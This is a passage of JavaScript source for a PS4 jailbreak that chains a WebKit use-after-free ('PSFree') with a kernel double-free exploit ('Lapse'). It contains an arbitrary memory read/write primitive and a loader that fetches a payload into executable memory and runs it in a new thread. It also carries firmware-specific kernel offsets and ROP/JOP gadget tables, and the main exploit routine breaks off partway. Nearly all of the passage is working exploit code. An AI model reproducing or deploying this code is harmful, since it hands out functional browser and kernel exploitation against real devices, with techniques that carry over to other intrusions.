  var og_array = new Uint32Array(0x1000);
  // 2. Get the memory address OF the 'og_array' JavaScript object itself.
  //    Then, add 0x10 (16 bytes) to it. This offset points to the
  //    internal metadata of the array, specifically where its
  //    "data pointer" (ArrayBufferView's 'data' field) is stored.
  var og_array_i = mem.addrof(og_array).add(0x10);
  // 3. --- This is the core of the exploit ---
  //    Overwrite the internal "data pointer" of 'og_array'.
  //    Instead of pointing to its own allocated buffer, make it point
  //    to the 'addr' that was passed into the function.
  mem.write64(og_array_i, addr);
  // 4. Overwrite the internal "length" property of 'og_array'.
  //    The array will now believe it has 'size' elements.
  //    (This offset, 0x8 bytes from the data pointer, is typical).
  mem.write32(og_array_i.add(0x8), size);
  // 5. Overwrite another internal field (likely capacity or a flag) to
  //    ensure the array is considered valid.
  mem.write32(og_array_i.add(0xc), 1);
  // 6. Push the 'og_array' to a special list (nogc = no garbage collection).
  //    This prevents the JavaScript engine from trying to "clean up"
  //    this corrupted object, which would likely cause a crash.
  nogc.push(og_array);
  // 7. Return the modified 'og_array'.
  //    Anyone using this array (e.g., `returned_array[0] = 0x...`)
  //    is NOT writing to a safe JavaScript buffer.
  //    They are writing directly to memory at 'addr'.
  return og_array;
}
//================================================================================================
// Payload Loader ================================================================================
//================================================================================================
// Allocate a small memory region (0x1000 bytes) using a system call (mmap).
// The flags 'PROT_READ | PROT_WRITE | PROT_EXEC' (RWX) are critical.
// This makes the memory Readable, Writable, and EXECUTABLE.
// This is a dangerous practice and is blocked by security measures in normal environments.
async function PayloadLoader(Pfile) {
  var loader_addr = chain.sysp(
    'mmap',
    new Int(0, 0), // Let the system choose the address
    0x1000, // Size of the memory to allocate
    PROT_READ | PROT_WRITE | PROT_EXEC, // Permissions: Read, Write, Execute (RWX)
    0x41000,
    -1, // File descriptor (none)
    0 // Offset (none)
  );
  // Get an array view of the newly allocated memory.
  var tmpStubArray = array_from_address(loader_addr, 1);
  // Write a small piece of machine code (a "stub") directly into the executable memory.
  // This stub will likely be used to jump to the main payload.
  tmpStubArray[0] = 0x00C3E7FF; // This is raw machine code (hex value)
  try {
    // Fetch the payload file (e.g., payload.bin) from the server
    const response = await fetch(Pfile);
    if (!response.ok) {
      throw new Error(`Payload ${Pfile} file read error: ${response.status}`);
    }
    var PLD = await response.arrayBuffer(); // Read the downloaded payload as an ArrayBuffer.
    // Allocate a second, larger memory region (0x300000 bytes) for the main payload.
    // Again, it's marked as RWX (permission 7 = 4[R] + 2[W] + 1[X]).
    var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
    // Get an array view of the large payload buffer.
    var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
    // Padding
    // Ensure the payload length is a multiple of 4 bytes (for 32-bit alignment).
    var padding = new Uint8Array(4 - (PLD.byteLength % 4) % 4);
    // Create a new temporary array to hold the payload + padding.
    var tmp = new Uint8Array(PLD.byteLength + padding.byteLength);
    // Copy the payload into the temporary array.
    tmp.set(new Uint8Array(PLD), 0);
    // Copy the padding (if any) after the payload.
    tmp.set(padding, PLD.byteLength);
    // Create a 32-bit integer view of the aligned payload.
    var shellcode = new Uint32Array(tmp.buffer);
    // Copy the final, aligned shellcode into the executable payload_buffer.
    pl.set(shellcode, 0);
    // Allocate memory for a pthread (thread) structure.
    var pthread = malloc(0x10);
    // Create a new native thread using the 'pthread_create' system call.
    call_nze(
      'pthread_create',
      pthread, // Pointer to the thread structure
      0, // Thread attributes (default)
      loader_addr, // The START ROUTINE (entry point) for the new thread. This is our "stub".
      payload_buffer, // The ARGUMENT to pass to the start routine. This is the address of our main payload.
    );
    // The stub at 'loader_addr' will likely jump to 'payload_buffer' and start executing the main shellcode.
  } catch (e) {
    //log(`PayloadLoader error: ${e}`);
    return 0;
  }
  return 1;
}
//================================================================================================
// Init Global Variables =========================================================================
//================================================================================================
function Init_Globals() {
  // Verify mem is initialized (should be initialized by make_arw)
  if (mem === null) {
    window.log("ERROR: mem is not initialized. PSFree exploit may have failed.\nPlease refresh page and try again...", "red");
    return 0;
  }
  // Kernel offsets
  switch (Console_FW_Version) {
    case "7.00":
    case "7.01":
    case "7.02":
      off_kstr = 0x7f92cb;
      off_cpuid_to_pcpu = 0x212cd10;
      off_sysent_661 = 0x112d250;
      jmp_rsi = 0x6b192;
      patch_elf_loc = "./kpatch700.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x256b0,
        'pthread_join': 0x27d00,
        'pthread_barrier_init': 0xa170,
        'pthread_barrier_wait': 0x1ee80,
        'pthread_barrier_destroy': 0xe2e0,
        'pthread_exit': 0x19fd0
      }));
      break;
    case "7.50":
      off_kstr = 0x79a92e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case "7.51":
    case "7.55":
      off_kstr = 0x79a96e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case "8.00":
    case "8.01":
    case "8.03":
      off_kstr = 0x7edcff;
      off_cpuid_to_pcpu = 0x228e6b0;
      off_sysent_661 = 0x11040c0;
      jmp_rsi = 0xe629c;
      patch_elf_loc = "./kpatch800.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25610,
        'pthread_join': 0x27c60,
        'pthread_barrier_init': 0xa0e0,
        'pthread_barrier_wait': 0x1ee00,
        'pthread_barrier_destroy': 0xe180,
        'pthread_exit': 0x19eb0
      }));
      break;
    case "8.50":
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      patch_elf_loc = "./kpatch850.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d50,
        'pthread_barrier_init': 0x283c0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25310
      }));
      break;
    case "8.52":
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      patch_elf_loc = './kpatch850.bin';
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d60,
        'pthread_barrier_init': 0x283d0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25320
      }));
      break;
    case "9.00":
      off_kstr = 0x7f6f27;
      off_cpuid_to_pcpu = 0x21ef2a0;
      off_sysent_661 = 0x1107f00;
      jmp_rsi = 0x4c7ad;
      patch_elf_loc = './kpatch900.bin';
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case "9.03":
    case "9.04":
      off_kstr = 0x7f4ce7;
      off_cpuid_to_pcpu = 0x21eb2a0;
      off_sysent_661 = 0x1103f00;
      jmp_rsi = 0x5325b;
      patch_elf_loc = './kpatch903.bin';
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case "9.50":
    case "9.51":
    case "9.60":
      off_kstr = 0x769a88;
      off_cpuid_to_pcpu = 0x21a66c0;
      off_sysent_661 = 0x1100ee0;
      jmp_rsi = 0x15a6d;
      patch_elf_loc = './kpatch950.bin';
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x1c540,
        'pthread_join': 0x9560,
        'pthread_barrier_init': 0x24200,
        'pthread_barrier_wait': 0x1efb0,
        'pthread_barrier_destroy': 0x19450,
        'pthread_exit': 0x28ca0
      }));
      break;
    default:
      throw "Unsupported firmware";
  }
  // ROP offsets
  switch (Console_FW_Version) {
    case "7.00":
    case "7.01":
    case "7.02":
      off_ta_vt = 0x23ba070;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ad0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x50a00;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001fa68, // `58 c3`
        "pop rbx; ret": 0x0000000000028cfa, // `5b c3`
        "pop rcx; ret": 0x0000000000026afb, // `59 c3`
        "pop rdx; ret": 0x0000000000052b23, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c987, // `5e c3`
        "pop rdi; ret": 0x000000000000835d, // `5f c3`
        "pop rsp; ret": 0x0000000000078c62, // `5c c3`
        "pop r8; ret": 0x00000000005f5500, // `41 58 c3`
        "pop r9; ret": 0x00000000005c6a81, // `47 59 c3`
        "pop r10; ret": 0x0000000000061671, // `47 5a c3`
        "pop r11; ret": 0x0000000000d4344f, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da462c, // `41 5c c3`
        "pop r13; ret": 0x00000000019daaeb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c986, // `41 5e c3`
        "pop r15; ret": 0x000000000024be8c, // `41 5f c3`
      
        "ret": 0x000000000000003c, // `c3`
        "leave; ret": 0x00000000000f2c93, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e852, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x00000000000203e9, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000020148, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000294dcc, // `89 30 c3`
      
        [jop8]: 0x00000000019c2500, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000007776e0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f84031, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001e25cce, // `52 ff 20`
        [jop7]: 0x0000000000078c62, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x277c4, "setcontext": 0x2bc18 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x161f0 }));
      Chain = Chain700_852;
      break;
    case "7.50":
    case "7.51":
    case "7.55":
      off_ta_vt = 0x23ae2b0;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ac0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x4f580;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000003650b, // `58 c3`
        "pop rbx; ret": 0x0000000000015d5c, // `5b c3`
        "pop rcx; ret": 0x000000000002691b, // `59 c3`
        "pop rdx; ret": 0x0000000000061d52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c827, // `5e c3`
        "pop rdi; ret": 0x000000000024d2b0, // `5f c3`
        "pop rsp; ret": 0x000000000005f959, // `5c c3`
        "pop r8; ret": 0x00000000005f99e0, // `41 58 c3`
        "pop r9; ret": 0x000000000070439f, // `47 59 c3`
        "pop r10; ret": 0x0000000000061d51, // `47 5a c3`
        "pop r11; ret": 0x0000000000d492bf, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da945c, // `41 5c c3`
        "pop r13; ret": 0x00000000019ccebb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c826, // `41 5e c3`
        "pop r15; ret": 0x000000000024d2af, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000025654b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e592, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005becb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000201c4, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002951bc, // `89 30 c3`
      
        [jop8]: 0x00000000019b4c80, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000077b420, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f87995, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001f1c866, // `52 ff 20`
        [jop7]: 0x000000000005f959, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25f34, "setcontext": 0x2a388 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x16220 }));
      Chain = Chain700_852;
      break;
    case "8.00":
    case "8.01":
    case "8.03":
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x12a30;
      off_wk_strlen = 0x918;
      off_strlen = 0x4eb80;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000035a1b, // `58 c3`
        "pop rbx; ret": 0x000000000001537c, // `5b c3`
        "pop rcx; ret": 0x0000000000025ecb, // `59 c3`
        "pop rdx; ret": 0x0000000000060f52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003bd77, // `5e c3`
        "pop rdi; ret": 0x00000000001e3f87, // `5f c3`
        "pop rsp; ret": 0x00000000000bf669, // `5c c3`
        "pop r8; ret": 0x00000000005ee860, // `41 58 c3`
        "pop r9; ret": 0x00000000006f501f, // `47 59 c3`
        "pop r10; ret": 0x0000000000060f51, // `47 5a c3`
        "pop r11; ret": 0x00000000013cad93, // `41 5b c3`
        "pop r12; ret": 0x0000000000d8968d, // `41 5c c3`
        "pop r13; ret": 0x00000000019a0edb, // `41 5d c3`
        "pop r14; ret": 0x000000000003bd76, // `41 5e c3`
        "pop r15; ret": 0x00000000002499df, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000291fd7, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002dc62, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005b1bb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000001f864, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002915bc, // `89 30 c3`
      
        [jop8]: 0x0000000001988320, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000076b970, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f62f95, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001ef0d16, // `52 ff 20`
        [jop7]: 0x00000000000bf669, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x258f4, "setcontext": 0x29c58 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x160c0 }));
      Chain = Chain700_852;
      break;
    case "8.50":
    case "8.52":
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x153c0;
      off_wk_strlen = 0x918;
      off_strlen = 0x4ef40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001ac7b, // `58 c3`
        "pop rbx; ret": 0x000000000000c46d, // `5b c3`
        "pop rcx; ret": 0x000000000001ac5f, // `59 c3`
        "pop rdx; ret": 0x0000000000282ea2, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000050878, // `5e c3`
        "pop rdi; ret": 0x0000000000091afa, // `5f c3`
        "pop rsp; ret": 0x0000000000073c2b, // `5c c3`
        "pop r8; ret": 0x000000000003b4b3, // `47 58 c3`
        "pop r9; ret": 0x00000000010f372f, // `47 59 c3`
        "pop r10; ret": 0x0000000000b1a721, // `47 5a c3`
        "pop r11; ret": 0x0000000000eaba69, // `4f 5b c3`
        "pop r12; ret": 0x0000000000eaf80d, // `47 5c c3`
        "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
        "pop r14; ret": 0x0000000000050877, // `41 5e c3`
        "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000001ba53, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
      
        [jop8]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x00000000021f3a2e, // `52 ff 20`
        [jop7]: 0x0000000000073c2b, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25904, "setcontext": 0x29c38 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x10750 }));
      Chain = Chain700_852;
      break;
    case "9.00":
    case "9.03":
    case "9.04":
      off_ta_vt = 0x2e73c18;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x1ff60;
      off_wk_strlen = 0x198;
      off_strlen = 0x4fa40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000051a12, // `58 c3`
        "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
        "pop rcx; ret": 0x00000000000657b7, // `59 c3`
        "pop rdx; ret": 0x000000000000986c, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
        "pop rdi; ret": 0x0000000000319690, // `5f c3`
        "pop rsp; ret": 0x000000000004e293, // `5c c3`
        "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
        "pop r9; ret": 0x0000000000422571, // `47 59 c3`
        "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
        "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
        "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
        "pop r13; ret": 0x00000000001da461, // `47 5d c3`
        "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
        "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000008db5b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
      
        [jop1]: 0x00000000004e62a4,
        [jop2]: 0x00000000021fce7e,
        [jop3]: 0x00000000019becb4,
      
        [jop4]: 0x0000000000683800,
        [jop5]: 0x0000000000303906,
        [jop6]: 0x00000000028bd332,
        [jop7]: 0x000000000004e293,
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x24f04, "setcontext": 0x29448 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xcb80 }));
      Chain = Chain900_960;
      break;
    case "9.50":
    case "9.51":
    case "9.60":
      off_ta_vt = 0x2ebea68;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x28870;
      off_wk_strlen = 0x198;
      off_strlen = 0x4c040;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000011c46, // `58 c3`
        "pop rbx; ret": 0x0000000000013730, // `5b c3`
        "pop rcx; ret": 0x0000000000035a1e, // `59 c3`
        "pop rdx; ret": 0x000000000018de52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000092a8c, // `5e c3`
        "pop rdi; ret": 0x000000000005d19d, // `5f c3`
        "pop rsp; ret": 0x00000000000253e0, // `5c c3`
        "pop r8; ret": 0x000000000003fe32, // `47 58 c3`
        "pop r9; ret": 0x0000000000aaad51, // `47 59 c3`
        "pop r11; ret": 0x0000000001833a21, // `47 5b c3`
        "pop r12; ret": 0x0000000000420ad1, // `47 5c c3`
        "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
        "pop r14; ret": 0x000000000028c900, // `41 5e c3`
        "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000056322, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
      
        [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
        [jop11]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
        [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`
      
        [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
        [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
        [jop6]: 0x00000000002b7a9c, // `52 ff 20`
        [jop7]: 0x00000000000253e0, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x21284, "setcontext": 0x254dc }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xbb60 }));
      Chain = Chain900_960;
      break;
    default:
      throw "Unsupported firmware";
  }
  syscall_array = [];
  libwebkit_base = null;
  libkernel_base = null;
  libc_base = null;
  gadgets = new Map();
  rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
  chain = null;
  nogc = [];
  _aio_errors = new View4(max_aio_ids);
  _aio_errors_p = _aio_errors.addr;
  return 1;
}
//================================================================================================
// Check Operating Platform ======================================================================
//================================================================================================
function checkPlatformIsSupported() {
  var userAgent = navigator.userAgent;
  var psRegex = /^Mozilla\/5\.0 \(?(?:PlayStation; )?PlayStation (4|5)[ \/]([0-9]{1,2}\.[0-9]{2})\)? AppleWebKit\/[0-9.]+ \(KHTML, like Gecko\)(?: Version\/[0-9.]+ Safari\/[0-9.]+)?$/;
  var match = userAgent.match(psRegex);
  if (!match) return false;
  var device = match[1];    // "4" or "5"
  var fwVersion = match[2]; // "9.00", "9.03", etc.
  Console_FW_Version = fwVersion;
  switch (Console_FW_Version) {
    case "6.00":
      config_target = 0x600;
      ssv_len = 0x58;
      break;
    case "6.50":
    case "6.72":
      config_target = 0x650;
      ssv_len = 0x48;
      break;
    case "7.00":
    case "7.01":
    case "7.02":
    case "7.50":
    case "7.51":
    case "7.55":
      config_target = 0x700;
      ssv_len = 0x48;
      break;
    case "8.00":
    case "8.01":
    case "8.03":
    case "8.50":
    case "8.52":
      config_target = 0x800;
      ssv_len = 0x48;
      break;
    case "9.00":
    case "9.03":
    case "9.04":
    default:
      config_target = 0x900;
      ssv_len = 0x50;
      break;
    case "9.50":
    case "9.51":
    case "9.60":
      config_target = 0x950;
      ssv_len = 0x50;
      break;
  }
  let res = 'var f = 0x11223344;\n';
  var cons_len = ssv_len - (8 * 5);
  for (let i = 0; i < cons_len; i += 8) {
    res += `var a${i} = ${num_leaks + i};\n`;
  }
  src_part = res;
  window.log("Detected FW: PS" + device + " v" + fwVersion + ", Exploit Version: v2.04\n");
  // Supported FW lists
  var supportedFW = {
    "4": ["6.99",
          "7.00", "7.01", "7.02", "7.50", "7.51", "7.55",
          "8.00", "8.01", "8.03", "8.50", "8.52",
          "9.00", "9.03", "9.04", "9.50", "9.51", "9.60"],
    "5": ["0.00"]
  };
  // Check device exists
  if (!supportedFW[device]) return false;
  // FW control
  return supportedFW[device].indexOf(fwVersion) !== -1;
}
//================================================================================================
// Main Jailbreak Function =======================================================================
//================================================================================================
async function doJBwithPSFreeLapseExploit() {
  if (!checkPlatformIsSupported()) {
    window.log("Unsupported platform detected! Designed for PS4 7.00 - 9.60", "red");
    /*
    window.log("Running DEMO application...\n");
    window.log("Detected FW: PS4 v9.00\n");
    window.log("Starting PSFree Exploit...");
    window.log("PSFree STAGE 1/3: UAF SSV");
    window.log("PSFree STAGE 2/3: Get String Relative Read Primitive");
    window.log("PSFree STAGE 3/3: Achieve Arbitrary Read/Write Primitive");
    window.log("Achieved Arbitrary R/W\n");
    window.log("Starting Lapse Kernel Exploit...");
    window.log('Lapse Setup');
    window.log('Lapse STAGE 1/5: Double free AIO queue entry');
    window.log(' - Won race at attempt: 0');
    window.log('Lapse STAGE 2/5: Leak kernel addresses');
    window.log(' - Found target_id at batch: 42');
    window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
    window.log(' - Aliased pktopts at attempt: 0');
    window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
    window.log(' - Found reclaim sd at attempt: 0');
    window.log('Lapse STAGE 5/5: Patch kernel');
    window.log("\nKernel exploit succeeded and AIO fixes applied", "green");
    window.log("GoldHen loaded", "green");
    window.log("\nPSFree & Lapse exploit with AIO fixes by ABC");
    window.log("\nATTENTION: This device is not jailbroken!!!","red");
    window.log("This screen is shown for DEMO purposes only");
    */
    return;
  }
  window.log("Starting PSFree Exploit...");
  try {
    window.log("PSFree STAGE 1/3: UAF SSV");
    await sleep(50); // Wait 50ms
    const [fsets, indices] = prepare_uaf();
    const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);
    window.log("PSFree STAGE 2/3: Get String Relative Read Primitive");
    await sleep(50); // Wait 50ms
    const rdr = await make_rdr(view);
    for (const fset of fsets) {
      fset.rows = '';
      fset.cols = '';
    }
    window.log("PSFree STAGE 3/3: Achieve Arbitrary Read/Write Primitive");
    await sleep(50); // Wait 50ms
    await make_arw(rdr, view2, pop);
    window.log("Achieved Arbitrary R/W\n");
  } catch (error) {
    window.log("An error occured during PSFree\nPlease refresh page and try again...\nError definition: " + error, "red");
    return;
  }
  window.log("Starting Lapse Kernel Exploit...");
  await sleep(200); // Wait 200ms
  // Lapse is a kernel exploit for PS4 [5.00, 12.02] and PS5 [1.00, 10.01]. It
  // takes advantage of a bug in aio_multi_delete(). Take a look at the comment
  // at the race_one() function here for a brief summary.
  
  // debug comment legend:
  // * PANIC - code will make the system vulnerable to a kernel panic or it will
  //   perform a operation that might panic
  // * RESTORE - code will repair kernel panic vulnerability
  // * MEMLEAK - memory leaks that our code will induce
  
  // overview:
  // * double free a aio_entry (resides at a 0x80 malloc zone)
  // * type confuse a evf and a ip6_rthdr
  // * use evf/rthdr to read out the contents of the 0x80 malloc zone
  // * leak a address in the 0x100 malloc zone
  // * write the leaked address to a aio_entry
  // * double free the leaked address
  // * corrupt a ip6_pktopts for restricted r/w
  // * corrupt a pipe for arbitrary r/w
  //
  // the exploit implementation also assumes that we are pinned to one core
  try {
    let jb_step_status;
    jb_step_status = Init_Globals();
    if (jb_step_status !== 1) {
      window.log("Global variables not properly initialized. Please restart console and try again...", "red");
      return;
    }
    await lapse_init();
    // Save the thread's CPU core and realtime priority to maintain system stability during the exploit.
    // Stability tweaks from Al-Azif's source
    const current_core = get_current_core();
    const current_rtprio = get_current_rtprio();
    //log(`current core: ${current_core}`);
    //log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
    // if the first thing you do since boot is run the web browser, WebKit can
    // use all the cores
    const main_mask = new Buffer(sizeof_cpuset_t_);
    //const main_mask = new Long();
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
    // spraying and grooming easier
    //log(`pinning process to core #${main_core}`);
    pin_to_core(main_core);
    //set_cpu_affinity(new Long(1 << main_core));
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    //log("setting main thread's priority");
    set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
    //sysi('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
    const [block_fd, unblock_fd] = (() => {
      const unix_pair = new View4(2);
      sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
      return unix_pair;
    })();
    const sds = [];
    for (let i = 0; i < num_sds; i++) {
      sds.push(new_socket());
    }
    try {
      if (sysi("setuid", 0) == 0) {
        window.log("\nAlready jailbroken, no need to re-jailbrake", "green");
        return;
      }
    }
    catch (error) {
      //window.log("\nAn error occured during if jailbroken test: " + error, "red");
    }
    let block_id = null;
    let groom_ids = null;
    window.log('Lapse Setup');
    await sleep(50); // Wait 50ms
    [block_id, groom_ids] = setup(block_fd);
    window.log('Lapse STAGE 1/5: Double free AIO queue entry');
    await sleep(50); // Wait 50ms
    const sd_pair = double_free_reqs2(sds);
    window.log('Lapse STAGE 2/5: Leak kernel addresses');
    await sleep(50); // Wait 50ms
